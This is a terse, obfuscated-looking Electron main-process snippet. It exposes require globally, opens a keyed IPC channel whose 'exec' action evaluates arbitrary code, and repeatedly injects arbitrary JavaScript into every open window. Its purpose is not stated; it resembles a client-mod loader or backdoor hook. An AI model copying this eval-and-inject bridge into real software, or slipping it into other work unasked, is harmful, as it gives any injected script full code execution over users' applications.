(function(){
    let t = global.___r_ = require;
    let a = t('crypto').randomBytes;
    let b = a(16).toString('hex');
    let c = 'channel-' + a(4).toString('hex');
    let d = t('electron');
    let e = {
      exec: (_, k) => {
        return {return:eval(k)}
      },
      i: (_, k) => {
        l(k)
      },
      j: (_, k) => {
        q(k)
      }
    };
    d.ipcMain.on(c, (h, i) => {
      if (!i || typeof i !== 'object' || i.apiKey !== b) return;
      let f = e[i.action];
      if (f && typeof f === 'function') {
        let q = c+'reply';
        try {
          let g = f(h, i.data);
          h.reply(q, { ok: true, act: i.action, ...g });
        } catch (j) {
          h.reply(q, { ok: false, act: i.action, err: j.message });
        }
      }
    });
    function l(n) {
      let m = n.replace('7c5a1bae0eae82d8246c6cb70be0beb5',b).replace('channel-0a4efbc3',c);
      d.BrowserWindow.getAllWindows().forEach(o => {
        if (o && o.webContents) {
          o.webContents.executeJavaScript(m)
            .catch(p => console.error(`[I_ERR]${o.getTitle()}:`, p));
        }
      });
    }
    global.___i_ = l;
    let q = global.___j_ = function (r) {
      let s = setInterval((function(){if(global.___i_)l(r);else clearInterval(s)}),5);
    }
})();